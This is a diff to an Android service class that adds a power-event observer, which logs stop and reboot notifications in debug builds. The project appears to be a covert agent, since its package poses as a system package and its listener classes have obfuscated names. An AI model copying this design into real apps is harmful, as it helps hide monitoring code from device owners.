@@ -10,13 +10,16 @@ import android.os.IBinder;
 import android.widget.Toast;
 
 import com.android.dvci.auto.Cfg;
+import com.android.dvci.event.LowEvent.PowerEvent;
+import com.android.dvci.interfaces.Observer;
 import com.android.dvci.listener.BAc;
 import com.android.dvci.listener.BC;
 import com.android.dvci.listener.BSm;
 import com.android.dvci.listener.BSt;
 import com.android.dvci.listener.ListenerProcess;
-import com.android.dvci.listener.ListenerStandby;
+import com.android.dvci.listener.LowEventPowerManager;
 import com.android.dvci.listener.WR;
+import com.android.dvci.module.message.LowEventPower;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.PackageUtils;
 import com.android.mm.M;
@@ -24,7 +27,7 @@ import com.android.mm.M;
 /**
  * The Class ServiceCore.
  */
-public class ServiceMain extends Service {
+public class ServiceMain extends Service implements Observer<LowEventPower> {
     private static final String TAG = "ServiceCore"; //$NON-NLS-1$
 
     BSt bst = new BSt();
@@ -288,4 +291,29 @@ public class ServiceMain extends Service {
     }
 
 
+	@Override
+	public int notification(LowEventPower b) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (notification)");//$NON-NLS-1$
+		}
+		if(b.power_data !=null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification) sub_type="+b.power_data.sub_type);//$NON-NLS-1$
+			}
+			if (b.power_data.sub_type == PowerEvent.POWER_STOP ) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (notification): STOP SYSTEM");//$NON-NLS-1$
+				}
+			} else 	if (b.power_data.sub_type == PowerEvent.POWER_REBOOT ) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (notification): REBOOT SYSTEM");//$NON-NLS-1$
+				}
+			}
+		}else{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification):b.power_data null");//$NON-NLS-1$
+			}
+		}
+		return 0;
+	}
 }
